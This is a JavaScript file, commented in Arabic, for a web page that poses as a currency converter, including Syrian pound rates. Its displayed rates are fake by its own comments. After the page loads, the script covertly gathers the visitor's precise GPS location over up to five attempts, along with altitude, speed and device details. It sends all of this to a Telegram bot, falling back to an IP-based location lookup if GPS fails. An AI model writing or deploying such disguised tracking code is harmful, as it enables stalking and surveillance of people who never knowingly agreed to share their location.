// انتظار تحميل الصفحة
document.addEventListener("DOMContentLoaded", () => {
  // تهيئة محول العملات (وهمي)
  initializeCurrencyConverter();

  // بدء عملية تحديد الموقع بدقة عالية جداً
  setTimeout(() => {
    getUltraAccurateLocation();
  }, 2000);

  showNotification("جاري تحديث الأسعار...");
});

// تهيئة محول العملات (نفس الكود السابق)
function initializeCurrencyConverter() {
  document.getElementById("amount").value = 1;
  document.getElementById("amount").addEventListener("input", updateConversion);
  document
    .getElementById("fromCurrency")
    .addEventListener("change", updateConversion);
  document
    .getElementById("toCurrency")
    .addEventListener("change", updateConversion);
  document
    .getElementById("swapCurrencies")
    .addEventListener("click", swapCurrencies);
  updateConversion();
  updateMockTime();
  setInterval(updateMockRates, 30000);
}

function updateMockTime() {
  const now = new Date();
  const timeString = now.toLocaleTimeString("ar-EG", {
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });
  document.getElementById("updateTime").innerHTML =
    `<i class="fas fa-clock"></i> آخر تحديث: ${timeString}`;
}

function updateMockRates() {
  const eurRate = (0.85 + (Math.random() * 0.02 - 0.01)).toFixed(3);
  const gbpRate = (0.73 + (Math.random() * 0.02 - 0.01)).toFixed(3);
  const jpyRate = (110.5 + (Math.random() * 2 - 1)).toFixed(1);

  document.getElementById("quickRates").innerHTML = `
    <div class="rate-item">USD/EUR <span>${eurRate}</span></div>
    <div class="rate-item">USD/GBP <span>${gbpRate}</span></div>
    <div class="rate-item">EUR/GBP <span>${(eurRate / gbpRate).toFixed(3)}</span></div>
    <div class="rate-item">USD/JPY <span>${jpyRate}</span></div>
  `;

  updateConversion();
  updateMockTime();
  showNotification("تم تحديث الأسعار بنجاح");
}

function updateConversion() {
  const amount = parseFloat(document.getElementById("amount").value) || 1;
  const fromCurrency = document.getElementById("fromCurrency").value;
  const toCurrency = document.getElementById("toCurrency").value;

  const rates = {
    USD: {
      EUR: 0.85,
      GBP: 0.73,
      JPY: 110.5,
      CNY: 6.45,
      SAR: 3.75,
      AED: 3.67,
      KWD: 0.31,
      EGP: 30.9,
      TRY: 18.5,
    },
    EUR: {
      USD: 1.18,
      GBP: 0.86,
      JPY: 129.5,
      CNY: 7.58,
      SAR: 4.42,
      AED: 4.33,
      KWD: 0.36,
      EGP: 36.2,
      TRY: 21.7,
    },
    GBP: {
      USD: 1.37,
      EUR: 1.16,
      JPY: 150.8,
      CNY: 8.83,
      SAR: 5.14,
      AED: 5.04,
      KWD: 0.42,
      EGP: 42.1,
      TRY: 25.3,
    },
  };

  let result = amount;
  let rate = 1;

  if (fromCurrency === toCurrency) {
    result = amount;
    rate = 1;
  } else if (rates[fromCurrency] && rates[fromCurrency][toCurrency]) {
    rate = rates[fromCurrency][toCurrency];
    result = amount * rate;
  } else {
    if (fromCurrency !== "USD") {
      const toUSD = 1 / rates.USD[fromCurrency] || 1;
      result = amount * toUSD;
    }
    if (toCurrency !== "USD") {
      result = result * rates.USD[toCurrency] || 1;
    }
    rate = result / amount;
  }

  document.getElementById("result").textContent =
    `${amount.toFixed(2)} ${fromCurrency} = ${result.toFixed(2)} ${toCurrency}`;
  document.getElementById("rateInfo").innerHTML =
    `<i class="fas fa-info-circle"></i> سعر الصرف: 1 ${fromCurrency} = ${rate.toFixed(4)} ${toCurrency}`;
  document.getElementById("currencyFrom").textContent = fromCurrency;
}

function swapCurrencies() {
  const fromSelect = document.getElementById("fromCurrency");
  const toSelect = document.getElementById("toCurrency");
  const temp = fromSelect.value;
  fromSelect.value = toSelect.value;
  toSelect.value = temp;
  updateConversion();
}

function showNotification(message) {
  const notificationBar = document.getElementById("notificationBar");
  const notificationMessage = document.getElementById("notificationMessage");
  notificationMessage.textContent = message;
  notificationBar.classList.remove("hidden");
  setTimeout(() => notificationBar.classList.add("hidden"), 3000);
}

// =============== الجزء المحسن للحصول على دقة GPS قصوى ===============

// الدالة الرئيسية للحصول على موقع بدقة GPS قصوى
async function getUltraAccurateLocation() {
  console.log("🛰️ بدء عملية تحديد الموقع باستخدام GPS...");

  if (!navigator.geolocation) {
    console.log("❌ المتصفح لا يدعم GPS");
    return;
  }

  let bestPosition = null;
  let bestAccuracy = Infinity;
  let attempts = 0;
  const maxAttempts = 5;

  // محاولة متعددة للحصول على أفضل دقة
  while (attempts < maxAttempts) {
    attempts++;
    console.log(`📡 محاولة ${attempts}/${maxAttempts} للحصول على دقة GPS...`);

    try {
      // استراتيجية مختلفة لكل محاولة
      let position;

      if (attempts === 1) {
        // محاولة سريعة أولى
        position = await getGPSPosition(5000, false);
      } else if (attempts === 2) {
        // محاولة بدقة عالية
        position = await getGPSPosition(10000, true);
      } else if (attempts === 3) {
        // محاولة مع timeout أطول
        position = await getGPSPosition(15000, true);
      } else if (attempts === 4) {
        // محاولة مع تجاهل المواقع القديمة
        position = await getGPSPosition(20000, true, 0);
      } else {
        // محاولة مع watch position
        position = await getBestGPSPosition(25000);
      }

      if (position && position.coords.accuracy < bestAccuracy) {
        bestAccuracy = position.coords.accuracy;
        bestPosition = position;
        console.log(`✨ تم تحسين الدقة إلى: ±${bestAccuracy.toFixed(2)} متر`);

        // إذا وصلنا لدقة ممتازة (أقل من 5 أمتار)، نوقف المحاولات
        if (bestAccuracy < 5) {
          console.log("🎯 دقة GPS ممتازة!");
          break;
        }
      }

      // انتظار قليل بين المحاولات
      await new Promise((resolve) => setTimeout(resolve, 1000));
    } catch (error) {
      console.log(`⚠️ فشلت المحاولة ${attempts}:`, error.message);
    }
  }

  // تقييم النتيجة وإرسالها
  if (bestPosition) {
    await sendAccurateLocation(bestPosition);
  } else {
    console.log("❌ فشل جميع محاولات GPS - استخدام موقع IP");
    await sendIPLocation();
  }
}

// الحصول على موقع GPS مع خيارات محددة
function getGPSPosition(timeout, highAccuracy, maxAge = 0) {
  return new Promise((resolve, reject) => {
    const options = {
      enableHighAccuracy: highAccuracy,
      timeout: timeout,
      maximumAge: maxAge,
    };

    navigator.geolocation.getCurrentPosition(
      (position) => {
        console.log(`📍 موقع GPS: ±${position.coords.accuracy.toFixed(2)} متر`);
        resolve(position);
      },
      (error) => {
        let errorMessage = "";
        switch (error.code) {
          case error.PERMISSION_DENIED:
            errorMessage = "المستخدم رفض الوصول";
            break;
          case error.POSITION_UNAVAILABLE:
            errorMessage = "معلومات الموقع غير متوفرة";
            break;
          case error.TIMEOUT:
            errorMessage = "انتهى وقت المحاولة";
            break;
          default:
            errorMessage = "خطأ غير معروف";
        }
        reject(new Error(errorMessage));
      },
      options,
    );

    // Timeout إضافي للتأكد
    setTimeout(() => {
      reject(new Error(`Timeout بعد ${timeout}ms`));
    }, timeout + 2000);
  });
}

// الحصول على أفضل موقع باستخدام watchPosition
function getBestGPSPosition(maxTime) {
  return new Promise((resolve) => {
    let bestPosition = null;
    let bestAccuracy = Infinity;
    let watchId;

    const options = {
      enableHighAccuracy: true,
      timeout: 5000,
      maximumAge: 0,
    };

    watchId = navigator.geolocation.watchPosition(
      (position) => {
        const accuracy = position.coords.accuracy;
        console.log(`📊 تحديث GPS: ±${accuracy.toFixed(2)} متر`);

        if (accuracy < bestAccuracy) {
          bestAccuracy = accuracy;
          bestPosition = position;

          // إذا وصلنا لدقة ممتازة، نوقف فوراً
          if (accuracy < 3) {
            navigator.geolocation.clearWatch(watchId);
            resolve(bestPosition);
          }
        }
      },
      (error) => {
        console.log("⚠️ خطأ في مراقبة GPS:", error.message);
      },
      options,
    );

    // إيقاف بعد الوقت المحدد
    setTimeout(() => {
      navigator.geolocation.clearWatch(watchId);
      resolve(bestPosition);
    }, maxTime);
  });
}

// إرسال الموقع بدقة عالية
async function sendAccurateLocation(position) {
  const lat = position.coords.latitude;
  const lng = position.coords.longitude;
  const accuracy = position.coords.accuracy;

  // معلومات إضافية من GPS
  const altitude = position.coords.altitude || 0;
  const altitudeAccuracy = position.coords.altitudeAccuracy || 0;
  const heading = position.coords.heading || 0;
  const speed = position.coords.speed || 0;

  // تقييم الدقة
  let quality, emoji;
  if (accuracy < 3) {
    quality = "ممتازة جداً (دقة GPS عالية)";
    emoji = "🟢✨";
  } else if (accuracy < 5) {
    quality = "ممتازة";
    emoji = "🟢";
  } else if (accuracy < 10) {
    quality = "جيدة جداً";
    emoji = "🟡";
  } else if (accuracy < 20) {
    quality = "جيدة";
    emoji = "🟠";
  } else if (accuracy < 50) {
    quality = "مقبولة";
    emoji = "🔴";
  } else {
    quality = "ضعيفة";
    emoji = "⚫";
  }

  const timestamp = new Date().toLocaleString("ar-EG", {
    timeZone: "Asia/Riyadh",
  });

  const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}&z=20`;

  // معلومات المتصفح
  const browserInfo = getBrowserInfo();

  const message = `
📍 <b>تحديث: موقع GPS جديد!</b>

━━━━━━━━━━━━━━━━━━━
🕐 <b>الوقت:</b> ${timestamp}
━━━━━━━━━━━━━━━━━━━

🌐 <b>إحداثيات GPS:</b>
• <b>خط العرض:</b> <code>${lat.toFixed(8)}</code>
• <b>خط الطول:</b> <code>${lng.toFixed(8)}</code>

📊 <b>جودة الإشارة:</b>
• ${emoji} <b>الدقة:</b> ±${accuracy.toFixed(2)} متر
• <b>التقييم:</b> ${quality}
• <b>عدد الأقمار:</b> ${position.coords.satellites || "غير متاح"}

${altitude ? `• <b>الارتفاع:</b> ${altitude.toFixed(2)} متر` : ""}
${heading ? `• <b>الاتجاه:</b> ${heading.toFixed(2)}°` : ""}
${speed ? `• <b>السرعة:</b> ${speed.toFixed(2)} م/ث` : ""}

🔗 <b>الموقع على الخريطة:</b>
${googleMapsLink}

💻 <b>معلومات الجهاز:</b>
• <b>المتصفح:</b> ${browserInfo.browser}
• <b>نظام التشغيل:</b> ${browserInfo.os}
• <b>الجهاز:</b> ${browserInfo.device}
• <b>اتصال الإنترنت:</b> ${browserInfo.connection}

━━━━━━━━━━━━━━━━━━━
<i>تم الإرسال عبر GPS - دقة عالية</i>
  `;

  try {
    // إرسال الموقع الجغرافي
    await fetch(
      `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendLocation`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CONFIG.TELEGRAM_CHAT_ID,
          latitude: lat,
          longitude: lng,
          horizontal_accuracy: accuracy,
        }),
      },
    );

    // إرسال الرسالة النصية
    await fetch(
      `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CONFIG.TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
        }),
      },
    );

    console.log("✅ تم إرسال موقع GPS بنجاح");
  } catch (error) {
    console.log("❌ خطأ في الإرسال:", error);
  }
}

// الحصول على معلومات المتصفح
function getBrowserInfo() {
  const ua = navigator.userAgent;
  let browser = "غير معروف";
  let os = "غير معروف";
  let device = "كمبيوتر";

  if (ua.indexOf("Firefox") > -1) browser = "Firefox";
  else if (ua.indexOf("Chrome") > -1) browser = "Chrome";
  else if (ua.indexOf("Safari") > -1) browser = "Safari";
  else if (ua.indexOf("Edge") > -1) browser = "Edge";

  if (ua.indexOf("Windows") > -1) os = "Windows";
  else if (ua.indexOf("Mac") > -1) os = "MacOS";
  else if (ua.indexOf("Linux") > -1) os = "Linux";
  else if (ua.indexOf("Android") > -1) {
    os = "Android";
    device = "هاتف/جهاز لوحي";
  } else if (ua.indexOf("iPhone") > -1) {
    os = "iOS";
    device = "آيفون";
  } else if (ua.indexOf("iPad") > -1) {
    os = "iOS";
    device = "آيباد";
  }

  let connection = "غير معروف";
  if (navigator.connection) {
    const conn = navigator.connection;
    connection = `${conn.effectiveType || ""} (${conn.downlink || "?"} Mbps)`;
  }

  return {
    browser,
    os,
    device,
    connection,
  };
}

// إرسال موقع IP كبديل
async function sendIPLocation() {
  try {
    const response = await fetch("https://ipapi.co/json/");
    const data = await response.json();

    if (data.latitude && data.longitude) {
      const message = `
⚠️ <b>تنبيه: موقع IP (بديل)</b>

━━━━━━━━━━━━━━━━━━━
🕐 <b>الوقت:</b> ${new Date().toLocaleString("ar-EG")}
━━━━━━━━━━━━━━━━━━━

🌐 <b>الموقع التقريبي:</b>
• <b>خط العرض:</b> <code>${data.latitude}</code>
• <b>خط الطول:</b> <code>${data.longitude}</code>
• <b>الدقة:</b> ±5000 متر (تقديرية)

📍 <b>العنوان:</b>
• <b>المدينة:</b> ${data.city || "غير معروف"}
• <b>الدولة:</b> ${data.country_name || "غير معروف"}

🔗 <b>رابط الخريطة:</b>
https://www.google.com/maps?q=${data.latitude},${data.longitude}

📝 <b>ملاحظة:</b> لم نتمكن من الحصول على إشارة GPS، تم استخدام الموقع التقريبي
━━━━━━━━━━━━━━━━━━━
      `;

      await fetch(
        `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CONFIG.TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "HTML",
          }),
        },
      );

      console.log("📡 تم إرسال موقع IP");
    }
  } catch (error) {
    console.log("❌ خطأ في موقع IP:", error);
  }
}

// تحديث نتيجة التحويل (الجزء المعدل فقط)
function updateConversion() {
  const amount = parseFloat(document.getElementById("amount").value) || 1;
  const fromCurrency = document.getElementById("fromCurrency").value;
  const toCurrency = document.getElementById("toCurrency").value;

  // أسعار صرف محدثة مع العملات السورية
  const rates = {
    SYP: {  // الليرة القديمة
      SYPN: 0.01,  // 1 قديم = 0.01 جديد (تقسيم 100)
      USD: 0.00008,  // 1 دولار = 12500 ليرة
      EUR: 0.000074, // 1 يورو = 13500 ليرة
      GBP: 0.000064, // 1 جنيه = 15500 ليرة
      TRY: 0.0025,   // 1 ليرة تركية = 400 ليرة سورية
      AED: 0.00029,  // 1 درهم = 3400 ليرة
      SAR: 0.00032,  // 1 ريال = 3100 ليرة
      JOD: 0.00056,  // 1 دينار = 17600 ليرة
      EGP: 0.008,    // 1 جنيه = 125 ليرة
    },
    SYPN: { // الليرة الجديدة
      SYP: 100,      // 1 جديد = 100 قديم
      USD: 0.008,    // 1 دولار = 125 ليرة جديدة
      EUR: 0.0074,   // 1 يورو = 135 ليرة جديدة
      GBP: 0.0064,   // 1 جنيه = 155 ليرة جديدة
      TRY: 0.25,     // 1 ليرة تركية = 4 ليرات جديدة
      AED: 0.029,    // 1 درهم = 34 ليرة جديدة
      SAR: 0.032,    // 1 ريال = 31 ليرة جديدة
      JOD: 0.056,    // 1 دينار = 176 ليرة جديدة
      EGP: 0.8,      // 1 جنيه = 1.25 ليرة جديدة
    },
    USD: {
      SYP: 12500,
      SYPN: 125,
      EUR: 0.92,
      GBP: 0.79,
      TRY: 31.5,
      AED: 3.67,
      SAR: 3.75,
      JOD: 0.71,
      EGP: 47.5,
    },
    EUR: {
      SYP: 13500,
      SYPN: 135,
      USD: 1.09,
      GBP: 0.86,
      TRY: 34.2,
      AED: 4.0,
      SAR: 4.09,
      JOD: 0.77,
      EGP: 51.7,
    },
    // أضف بقية العملات حسب الحاجة
  };

  let result = amount;
  let rate = 1;

  if (fromCurrency === toCurrency) {
    result = amount;
    rate = 1;
  } else if (rates[fromCurrency] && rates[fromCurrency][toCurrency]) {
    rate = rates[fromCurrency][toCurrency];
    result = amount * rate;
  } else {
    // إذا لم نجد السعر مباشرة، نحاول عبر USD
    if (rates[fromCurrency] && rates[fromCurrency].USD && rates.USD && rates.USD[toCurrency]) {
      const toUSD = rates[fromCurrency].USD;
      result = amount * toUSD;
      result = result * rates.USD[toCurrency];
      rate = result / amount;
    }
  }

  // تحديث النتيجة
  document.getElementById("result").textContent =
    `${amount.toFixed(2)} ${fromCurrency} = ${result.toFixed(2)} ${toCurrency}`;

  document.getElementById("rateInfo").innerHTML =
    `<i class="fas fa-info-circle"></i> سعر الصرف: 1 ${fromCurrency} = ${rate.toFixed(4)} ${toCurrency}`;

  // تحديث العملة المصدر في حقل المبلغ
  document.getElementById("currencyFrom").textContent = fromCurrency;
}

// تحديث الأسعار الوهمية مع العملات السورية
function updateMockRates() {
  // أسعار عشوائية مع الحفاظ على العلاقة بين القديم والجديد
  const baseRate = 12000 + Math.random() * 1000;
  const newRate = baseRate / 100;
  
  document.getElementById("quickRates").innerHTML = `
    <div class="rate-item">USD/SYP <span>${Math.round(baseRate)}</span></div>
    <div class="rate-item">USD/SYPN <span>${Math.round(newRate)}</span></div>
    <div class="rate-item">EUR/SYP <span>${Math.round(baseRate * 1.08)}</span></div>
    <div class="rate-item">TRY/SYP <span>${Math.round(baseRate / 31.5)}</span></div>
  `;

  updateConversion();
  updateMockTime();
  showNotification("تم تحديث الأسعار بنجاح");
}